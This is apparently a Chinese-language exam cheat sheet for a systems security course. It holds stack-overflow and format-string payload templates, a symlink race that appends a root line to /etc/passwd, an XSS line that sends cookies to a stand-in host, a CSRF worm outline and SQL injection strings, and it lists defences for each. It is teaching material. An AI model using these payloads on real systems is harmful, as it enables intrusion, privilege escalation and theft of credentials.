SFS 期末 Cheat Sheet（正）　Ⅰ 栈溢出通解　·　Ⅱ 格式化字符串通解

Ⅰ 栈溢出：一套通解打所有数据

符号：B = buffer 地址　E = ebp(32)/rbp(64) 地址　W = 字宽 4 或 8　L = 输入长度上限（badfile 大小）　s = shellcode 长度　Δ = shellcode 相对 B 的偏移

核心只有两式

off = E − B + W            # 返回地址相对 buffer 的偏移
ret = B + Δ                # 要写进 ret 槽位的值（指向 shellcode/sled）

① 求 off：按「已知程度」分三种

题目给了什么怎么定 off
B 和 E 都给直接代入，off 唯一
只给 B，E 未知（打码、帧大小不定）把 off 看成区间 [lo, hi]，步长 W，每个槽位都写同一个 ret
B、E 都不给（ASLR）先泄漏（%p／程序打印）拿 B；或爆破：只随机低 16 位，按页猜

② 拼 payload：与具体数值无关的模板

P = bytearray(b'\x90' * L)          # ① 全填 NOP
P[Δ : Δ+s] = SC                     # ② 放 shellcode
for k in range(lo, hi+1, W):        # ③ 覆盖所有可能的 ret 槽位
    P[k : k+W] = le(B + Δ, W)       #    小端写地址
send(P)

两种放法二选一：尾部（Δ = L−s，ret 指向 sled 中部，容错最大）／最前面（Δ = 0，64 位或 \x00 截断时用）。
给了 E：lo = hi = off；没给 E：lo = off_min, hi = off_max，这一行就把「全部填满」的题解掉了。

NOP sled
0 … Δ		 shellcode
Δ … Δ+s		 填充 ret × k
off … off+W·k

payload 布局（所有变体共用）：低地址 → 高地址。k = 要覆盖的槽位数（已知 E 时 k=1，扫区间时 k=(hi−lo)/W+1），每个槽位写同一个 B+Δ。

③ 三个必查的坑（无关数据、必错点）

  • 小端：le(addr, W) 低字节在前，32 位 4 字节、64 位 8 字节。
  • \x00 截断：strcpy/scanf 遇到 0 就停 → 含 \x00 的地址必须放在 payload 最末尾，或让 Δ = 0（shellcode 在前，ret 之后无内容）。
  • 长度上限：若 L ≤ off，根本盖不到 ret → 只能改相邻变量/函数指针，不能套本模板。

④ 四种变体 = 同一模板换参数

变体变的只有
32 位、地址固定W=4，off 唯一，Δ 取 sled 中部
buffer 小、输入大lo..hi 扫整段（如 100..256 步长 4），ret = B+Δ 固定
64 位W=8，off = E−B+8，Δ=0（shellcode 放最前）
开 ASLRB、E 随机 → 先泄漏或爆破，模板不变

⑤ 拿 B、E 的四条路

  • 程序自己打印（本题）→ 直接代入公式。
  • 格式化串泄漏：%p 输出里通常就有栈地址。
  • gdb：p &buffer、p $ebp（同进程、ASLR 关）。
  • shellcode 放环境变量/argv，栈顶地址相对稳定。

⑥ 两个常见变体（模板不变）

  • NX 栈不可执行：不能 ret2shellcode → 改 ret2libc/ROP，结构仍是"覆盖 ret"，只是 ret 换成 gadget 链。
  • 能写 \x00 的输入（read/fgets）：ret 可写满 8 字节，不用回避 0。
# ⑦ 32 / 64 位模板对照
# 32 位：off = E-B+4
P[off:off+4] = le32(B+Δ)
# 64 位：off = E-B+8，shellcode 放最前 Δ=0
P[off:off+8] = le64(B)     # 末尾 \x00 → 放在 payload 最后

⑧ 套小测题

  • 给 B=0x00BBCC00、E=0x00BBCD00 → off = E−B+W = 0x104，ret = B+Δ（Δ 取 4 或 sled 中部）。
  • E 被打码 0xAABB8**0 → 算不出唯一 off → 用 for k in range(lo,hi+1,W) 全填，这就是"把所有可能位置都填上"的通用理由。
  • 答辩三件套：栈示意图（buffer→ebp→ret）＋ 为什么全覆盖更稳 ＋ 小端。

Ⅱ 格式化字符串：一套通解打所有数据

符号：B = fmt 指向的 buffer 地址　W = 4/8　p = buffer[0] 对应的参数序号　K = 地址表在 buffer 里的偏移　C = 累计已输出字符数　V = 目标地址　X = 要写入的值

核心恒等式（一切定位都靠它）

参数序号 = p + K / W
# 32 位例：p=64，K=1000 → 第 64+250 = 314 个参数 = buffer[1000]
# 64 位例：p=159，K=1000 → 第 159+125 = 284 个参数

① 先测 p：buffer[0] 是第几个参数

  • 32 位：发 "%x"*n，输出里等于 B（或特征值 0x41414141）的那个就是 p。参数全在栈上。
  • 64 位：发 "%p"*n；前 6 个在寄存器 rdi,rsi,rdx,rcx,r8,r9，%7 起才在栈上。
  • payload："AAAA" + "%p"*n → 找 0x41414141 最稳。

② 任意读：把地址塞进参数区

P = le(V, W) + f"%{p}$s".encode()    # 地址在 buffer[0] → 就是第 p 个参数
# 等价顺序写法（不用 $）：地址放 buffer[0]，第 p 个 %x 换成 %s

32 位 4 字节地址正好占一个参数；64 位 8 字节占一个参数。%s 把该参数当地址解引用。

③ 任意写：小值直接用 %n，大值拆字节

值 X 小（X 不超过几万）：P = le(V,W) + f"%{X}d%n" → 输出 X 个字符后把计数写进 V。

值 X 任意（通解）：

bs = [(X>>8*i)&0xff for i in range(4)]        # 或 6 个（64 位）
items = sorted(zip(bs, [V+i for i in range(4)]))   # ① 按字节值升序
# ② 地址表放 buffer[K]，K 对齐且 > len(fmt)
# ③ 前面用 K//W 个 %x 把游标推到地址表
# ④ 依次补差值：d1 = v1 - C0，di = vi - v(i-1)（负数就 +256）
fmt = "%x"*(K//W) + f"%{d1}d%hhn" + f"%{d2}d%hhn" + f"%{d3}d%hhn" + f"%{d4}d%hhn"

为什么必须升序：%hhn 写的是累计输出数，只能增不能减 → 按字节值从小到大排，差值才为正；不够一圈就 +256 再绕。

④ 改返回地址 = 把 V 换成 ret 槽位

V = E + W          # ret 的地址
X = B + Δ          # 想跳到的 shellcode 地址
# 然后套 ③ 的拆字节流程即可

64 位：返回地址 8 字节，但高 2 字节本来就是 0x0000，只写低 6 字节（6 次 %hhn），否则会把高位改成非零而崩溃。

⑤ 双候选地址（小测原题）通解

  • 题目给 A1、A2 两个可能的 ret 位置、不知道用哪个 → 两处都写成同一个 X。
  • 把 A1、A2 的地址都放进地址表；先写完第一处的 4 字节，再写第二处（同值 → 第 5 段差值为 0，或 +256）。
  • 用 B−C = 0x40（=16 个参数位）把地址表的序号算出来：序号 = p + 16。
  • 题目禁止 %n 时：全部改 %hn/%hhn，并逐步写出「此刻累计输出了多少字符」——这是给分点。

⑥ %n 家族：写几字节、值是多少

写法写几字节写入值用在哪
%n4C一次写小值
%hn2C & 0xffff拆 2 段
%hhn1C & 0xff拆 4/6 段（通解）

C = 到目前为止 printf 已输出的字符数，所以 %Nd 的 N 是"要补到多少"而不是绝对值：N_i = (v_i − C_{i−1}) mod 256，算出 0 就写 256。
技巧：前面的 %x 换成 %8x（定宽 8），C₀ 就能精确算成 8·(K/W)，不用逐个去数。

⑦ 目标不止 ret

  • GOT 表项（如 printf@got）→ 改成 system/one-gadget，但要先泄漏 libc 基址。
  • 函数指针、栈上的指针变量 → 同样"把它当地址 V"套 ③。
  • 读：%s 读 GOT 项 → 得到 libc 地址，配合上面的写完成"泄漏 + 劫持"。

⑧ 三个必查的坑

  • 地址必须对齐：32 位 4 字节、64 位 8 字节对齐，否则 %s/%n 取到错位的值。
  • K 要 > len(fmt)：地址表不能被格式串覆盖（这也是为什么放 1000 而不是 0）。
  • 为 0 的字节：%hhn 写 0 需要 +256 绕圈，或放在第一个写（此时 C0 已非 0，要算 mod 256）。

SFS 期末 Cheat Sheet（反）　Ⅲ Set-UID/TOCTOU　Ⅳ 侧信道　Ⅴ XSS　Ⅵ SQL　Ⅶ 通用　Ⅷ 速判　Ⅸ 模板

Ⅲ Set-UID 与 TOCTOU（精简）

两个身份：real UID = getuid()（你是谁）；effective UID = geteuid()（系统按谁判权限）。Set-UID(4755) 被 seed 跑时 euid=root。

漏洞骨架：access(fn,W_OK) 用 real 判 → fopen(fn,"a+") 用 euid=root 开。两次调用之间把 /tmp/XYZ 从「自己的普通文件」换成「指向 /etc/passwd 的软链」。

echo dummy > /tmp/XYZ ; rm -f /tmp/XYZ ; ln -s /etc/passwd /tmp/XYZ
# 稳定版：一次系统调用原子交换两个路径
while(1) renameat2(0,X,0,A,RENAME_EXCHANGE);
# 追加进 /etc/passwd 的一行：
x:U6aMy0wojraho:0:0::/root:/bin/bash

防御：① 最小权限 seteuid(real) → 检查+打开 → seteuid(eff) 写 → 降回；② fs.protected_symlinks=1：仅当「sticky 世界可写目录 + 链接 owner≠euid + 目录 owner≠euid」才拒绝跟随（不防硬链接、不防其它 TOCTOU）。

小测要点：lstat 查类型+属主 挡不住（A 时指向自己的普通文件、C 时已换成 /etc/protected）；再加一次 lstat 也没用，窗口只是变窄；fp 一旦打开就绑定 inode，换路径名不影响它 → 要用 fstat(fileno(fp)) 校验 fd。
reportdesk 三洞：① strncmp(argv[1],prefix,17) 只比前缀 → /opt/lab/reports/../../etc/passwd 穿越；② fd 未带 O_CLOEXEC 会漏进 shell（本题带了，故不成立）；③ REPORT_AUDIT 来自 getenv → 可指向任意文件。

Ⅳ Spectre / Meltdown（精简）

侧信道：_mm_clflush(&a) 逐出 → 触发受害代码 → clock_gettime 计时 reload。命中快（约 20~30）、未命中慢（200+），阈值取 81。

Spectre 四步：① for i in 0..9 { clflush(&size); victim(i) } 训练；② 传越界 x，CPU 预测「仍为小」→ 乱序执行 array[s*4096+DELTA]+=88；③ 该页进 cache；④ reload 256 页取最快者 = 秘密字节。

  • 删掉 clflush(&size) → 成功率断崖：size 还在 cache，不必投机就够快。
  • victim(i+20) → 失败：训练成「预测越界」，越界结果本来就不用丢弃，没有投机窗口。
  • s=0 会污染第 0 页 → max 与循环都从 1 开始。

Meltdown：直接读内核地址 → 异常提交前乱序把 array[k*4096] 拉进 cache → setjmp/longjmp 捕 SIGSEGV 后 reload。

对比：共同 = 乱序执行 + 侧信道；不同 = Meltdown 读内核/跨进程、不需训练；Spectre 读同进程沙盒、需训练分支预测。防：KPTI、lfence、微码。

Ⅴ XSS（简）

<script>alert(1)</script>                        # 能执行
<script>new Image().src='http://att/?c='+document.cookie</script>   # 外带
# 读 CSRF token 后伪造请求（同源才能读）
ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
tk="&__elgg_token="+elgg.security.token.__elgg_token;
GET /action/friends/add?friend=59 + ts + tk

蠕虫：getElementById("worm").innerHTML 取自身 → encodeURIComponent → 写回 description；if(guid!=59) 防止改掉自己。
CSP：script-src 'self' *.example70.com 无 'unsafe-inline' → 内联全禁；'nonce-xxx' 逐个比对；onclick= 也算内联，同样被拦。

Ⅵ SQL 注入（简）

登录绕过：admin'# → WHERE name='admin'#' and Password='…'，密码条件被注释。命令行：%27='%23=#%20=空格。
多语句不行：mysqli::query() 只执行一条。

nickname = ', salary=1 WHERE name='Boby'; #
nickname = ', Password='7c4a8d09…' WHERE name='Boby';#   # sha1("123456")

防御：prepare("… WHERE name=? and Password=?") → bind_param("ss",…) → execute()。先编译骨架、后绑数据，输入永远进不了语法。

Ⅶ 通用：一条主线 + 答题模板

共同根因：不可信输入被当成了代码/控制数据——栈溢出（数据改返回地址）、格式化串（数据当格式指令）、SQL（数据当语句）、XSS（数据当 JS）、TOCTOU（检查与使用不同时机）。

防御四层：输入（长度/白名单/上下文转义）｜内存（canary、NX、ASLR、PIE、printf("%s",m)）｜权限（最小权限、O_CLOEXEC、NOFOLLOW、fstat）｜Web（CSP+nonce、HttpOnly、CSRF token、Prepared Statement）。

答题模板：① 漏洞点（哪行、缺什么检查）→ ② 触发条件（能控制什么、有无窗口）→ ③ 具体构造（payload/时序/地址，给分最密）→ ④ 后果（读/写/执行什么）→ ⑤ 修复（哪一层、为什么有效）。

Ⅷ 题型速判：看到题干先对号

题干关键词套哪一套
strcpy、badfile、打印 buffer/ebp、栈示意图Ⅰ 栈溢出通解
printf(msg)、%x/%n、格式串、构造输入Ⅱ 格式化串通解
Set-UID、access、符号链接、/tmp/XYZⅢ TOCTOU
cache、分支预测、乱序、clflushⅣ 侧信道
profile、<script>、cookie、CSPⅤ XSS
登录、WHERE、UPDATE、salaryⅥ SQL

Ⅸ 答题模板

① 漏洞点（哪行、缺什么检查）→ ② 触发条件（能控制什么、有无窗口）→ ③ 具体构造（payload / 时序 / 地址，给分最密）→ ④ 后果（读/写/执行什么）→ ⑤ 修复（哪一层、为什么有效）。

口诀：栈溢出=填满再跳；格式化=先测 p 再用 K/W 定位；SetUID=换链接；侧信道=先清缓存；XSS=读 token 发请求；SQL=闭合引号加注释。
